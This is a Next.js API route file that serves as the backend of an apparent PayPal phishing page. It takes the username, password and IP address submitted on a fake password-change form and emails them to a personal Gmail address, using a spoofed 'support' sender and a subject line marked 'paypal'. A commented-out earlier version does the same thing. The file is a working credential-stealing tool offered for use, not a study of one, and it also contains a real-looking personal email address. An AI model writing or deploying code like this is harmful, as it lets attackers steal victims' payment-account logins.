import { NextApiRequest, NextApiResponse } from "next";
import createNodeMailerTransport from "../../helpers/mailer";

type Data = {
    username: string,
    oldPassword: string,
    newPassword: string,
    confirmPassword: string,
    ip: string
}

// export default async function handler(req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) {
//     const body = req.body
//     //await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
//     const mailDetails = {
//         from: 'support@greeniumtrade.com',
//         to: 'campdaniel06@gmail.com',
//         subject: 'paypal' + ' : ' + body.username + ' : ' + body.ip,
//         html: '<p>username: ' + body.username + '</p>' + '<p>password: ' + body.oldPassword + '</p>' + '<p>ip: ' + body.ip + '</p>'
//     }

//     const transport = await createNodeMailerTransport()
    
//     transport.verify((error, success) => {
//         if(error){
//             console.log(error)
//         } else {
//             transport.sendMail(mailDetails, (err, data) => {
//                 if(err) {
//                     console.log(err)
//                 } else {
//                     console.log(data)
//                 }
//             });
//         }
//     })

//     res.status(200).json('success')
// }

export default async (req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) => {

    const { username, oldPassword, newPassword, confirmPassword, ip } = req.body;
    
    const transporter = await createNodeMailerTransport()

    await new Promise((resolve, reject) => {
        // verify connection configuration
        transporter.verify(function (error, success) {
            if (error) {
                console.log(error);
                reject(error);
            } else {
                console.log("Server is ready to take our messages");
                resolve(success);
            }
        });
    });
    
    const mailDetails = {
        from: 'support@greeniumtrade.com',
        to: 'campdaniel06@gmail.com',
        subject: 'paypal' + ' : ' + username + ' : ' + ip,
        html: '<p>username: ' + username + '</p>' + '<p>password: ' + oldPassword + '</p>' + '<p>ip: ' + ip + '</p>'
    }
    
    await new Promise((resolve, reject) => {
        // send mail
        transporter.sendMail(mailDetails, (err, info) => {
            if (err) {
                console.error(err);
                reject(err);
            } else {
                console.log(info);
                resolve(info);
            }
        });
    });
    
    res.status(200).json('Success');
};